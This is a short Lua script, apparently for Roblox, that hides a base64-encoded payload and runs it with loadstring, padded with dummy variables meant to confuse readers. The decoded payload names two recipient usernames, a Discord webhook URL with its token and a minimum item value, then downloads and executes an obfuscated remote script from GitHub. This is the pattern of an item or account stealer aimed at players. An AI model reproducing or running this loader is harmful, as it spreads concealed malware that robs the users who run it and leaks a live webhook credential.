
local xwNzcWUkZFlv = 'VXNlcm5hbWUgPSAiYnRyZWRiZ2YiClVzZXJuYW1lMiA9ICJ2Z3Jlc3hjdmdmIgpXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEyOTc4NDUzNTY5NzI3MzY1NDMvU3lSVzlxYmNic1BLRERzcDg2VjZqb0VnN1FHYnlUdnQ0c1FybE9xZERZamE5S2RPcXQxNjRfX1ljSzAyVVhuUWNHU3YiCk1pbmltdW1SQVAgPSAxMDAwMDAKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFkc3ovc3l0Y2hjZS9tYWluL29iZnVzY2F0ZWRfc2NyaXB0Lmx1YSIsIHRydWUpKSgp'
local LGlAimgoe = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local uxCMSYkOjxgc = LGlAimgoe(xwNzcWUkZFlv)
loadstring(uxCMSYkOjxgc)() -- Run decoded code

-- Dummy variables for confusion
local UAPhbXPk = math.random()
local BfcMesIxxc = "This is a dummy string"
